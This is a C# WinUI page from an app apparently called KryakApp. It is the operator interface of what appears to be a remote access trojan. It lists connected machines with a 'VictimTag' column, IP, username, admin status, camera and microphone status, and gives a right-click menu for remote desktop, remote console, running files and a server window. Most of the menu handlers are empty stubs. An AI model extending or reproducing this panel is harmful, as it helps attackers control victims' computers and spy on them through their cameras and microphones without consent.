using KryakApp.Controls;
using KryakApp.Services;
using Microsoft.UI.Xaml.Controls;
using KryakApp.Windows;
using Microsoft.UI.Xaml;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;

namespace KryakApp.Pages
{
    public sealed partial class NodesPage : Page
    {
        private readonly List<Window> _openedWindows = [];

        public NodesPage()
        {
            InitializeComponent();

            SetupGrid();
            SetupGridEvents();
        }

        private void SetupGrid()
        {
            PeopleGrid.Columns = new ObservableCollection<DataGridColumnDefinition>
            {
                new() { Header = "IP", PropertyName = nameof(UserData.UserIPAddress) },
                new() { Header = "Tag", PropertyName = nameof(UserData.VictimTag) },
                new() { Header = "Username", PropertyName = nameof(UserData.Username) },
                new() { Header = "Country", PropertyName = nameof(UserData.Country) },
                new() { Header = "OS", PropertyName = nameof(UserData.UserOS) },
                new() { Header = "Admin", PropertyName = nameof(UserData.AdminStatus) },
                new() { Header = "Cam", PropertyName = nameof(UserData.CameraStatus) },
                new() { Header = "Mic", PropertyName = nameof(UserData.MicrophoneStatus) },
                new() { Header = "Ping", PropertyName = nameof(UserData.Ping) }
            };

            PeopleGrid.Items = App.ConnectedUsers.Users;
        }

        private void SetupGridEvents()
        {
            PeopleGrid.RowRightClick += PeopleGrid_RowRightClick;
        }

        private void PeopleGrid_RowRightClick(object? sender, CustomDataGridRowRightClickEventArgs e)
        {
            if (e.RowItem is not UserData row)
            {
                return;
            }

            MenuFlyout menu = CreateRowMenu(row);
            ProtectedCursor = null;
            menu.ShowAt(PeopleGrid, e.Position);
        }

        private MenuFlyout CreateRowMenu(UserData row)
        {
            MenuFlyout menu = new();

            MenuFlyoutItem ManagerItem = new()
            {
                Text = "Manager",
                Icon = new SymbolIcon(Symbol.Contact)
            };
            ManagerItem.Click += (_, _) => Manager(row);

            MenuFlyoutItem RemoteDesktopItem = new()
            {
                Text = "Remote desktop",
                Icon = new SymbolIcon(Symbol.Remote)
            };
            RemoteDesktopItem.Click += (_, _) => RemoteDesktop(row);

            MenuFlyoutItem RemoteConsoleItem = new()
            {
                Text = "Remote console",
                Icon = new SymbolIcon(Symbol.AllApps)
            };
            RemoteConsoleItem.Click += (_, _) => RemoteConsole(row);

            MenuFlyoutItem RunFileItem = new()
            {
                Text = "Run file",
                Icon = new SymbolIcon(Symbol.OpenFile)
            };
            RunFileItem.Click += (_, _) => RunFile(row);

            MenuFlyoutItem ServerItem = new()
            {
                Text = "Server",
                Icon = new SymbolIcon(Symbol.World)
            };
            ServerItem.Click += (_, _) => Server(row);

            menu.Items.Add(ManagerItem);
            menu.Items.Add(RemoteDesktopItem);
            menu.Items.Add(RemoteConsoleItem);
            menu.Items.Add(RunFileItem);
            menu.Items.Add(ServerItem);

            return menu;
        }

        private void Manager(UserData user)
        {
            
        }
        private void RemoteDesktop(UserData user)
        {

        }
        private void RemoteConsole(UserData user)
        {

        }
        private void RunFile(UserData user)
        {

        }
        private void Server(UserData user)
        {
            ClientServerWindow window = new(user);
            window.Closed += ChildWindow_Closed;
            _openedWindows.Add(window);
            window.Activate();
        }

        private void ChildWindow_Closed(object sender, WindowEventArgs args)
        {
            if (sender is Window window)
            {
                _openedWindows.Remove(window);
            }
        }
    }
}
